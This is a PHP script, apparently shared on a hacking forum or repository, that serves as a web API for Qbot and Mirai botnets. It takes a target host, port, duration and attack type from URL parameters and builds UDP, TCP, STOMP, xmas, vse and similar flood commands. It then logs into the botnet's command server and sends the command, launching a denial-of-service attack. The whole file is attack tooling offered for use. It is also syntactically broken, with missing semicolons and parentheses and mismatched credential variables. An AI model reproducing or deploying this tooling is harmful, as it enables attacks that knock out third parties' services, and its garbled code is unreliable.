<?php
//Unviseral Api
//Made for 	Qbot or Mirai 
//You're Welcome @MySqlDatabases Created this
set_time_limit(0);

//Server IP Address
$serveraddress = "Ip";
//CNC Port
$cncport = "Port";
//Cnc Login
$netusername = "username";
$netpassword = "password";

$activekeys = array();

$method = $_GET['type']
$target = $_GET['host']
$port = $_GET['port']
$time = $_GET['time']

//Methods Change to Your Net Source Attack Methods//
//Qbot Commands
if($method == "UDP"{$command = "!* UDP $target $port $time 32 0 10";}
if($method == "TCP"{$command = "!* TCP $target $port $time 32 all 0 10";}
if($method == "STD"{$command = "!* STD $target $port $time";}
if($method == "HEX"{$command = "!* HEX $target $port $time";}
if($method == "STOMP"{$command = "!* STOMP $target $port $time 32 0 10";}
if($method == "CNC"{$command = "!* CNC $target $port $time";}
//Mirai Methods
if($method == "udpplain"{$command = "udpplain $target $time dport=$port";}
if($method == "xmas"{$command = "xmas $target $time dport=$port";}
if($method == "vse"{$command = "vse $target $time dport=$port";}
if($method == "std"{$command = "std $target $time dport=$port";}

$sock = fsockopen($serveraddress, $cncport, $errno, $errstr, 2);

if(!$sock){
	echo"Could Not Connect To CNC Address";
)else{
	   print(fread($sock, 1024)."\n");
	   fwrite($sock, $username . "\n");
	   echo "<br>";
	   print(fread($sock, 1024)."\n");
	   fwrite($sock, $password . "\n");
	   echo "<br>"
	   if(fread($sock, 1024)){
		   print(fread($sock, 1024)."\n");
	   }
	   
	   fwrite($sock, $command . "\n");
	   fclose($sock);
	   echo "<br>";
	   echo "> $command ";
}
?>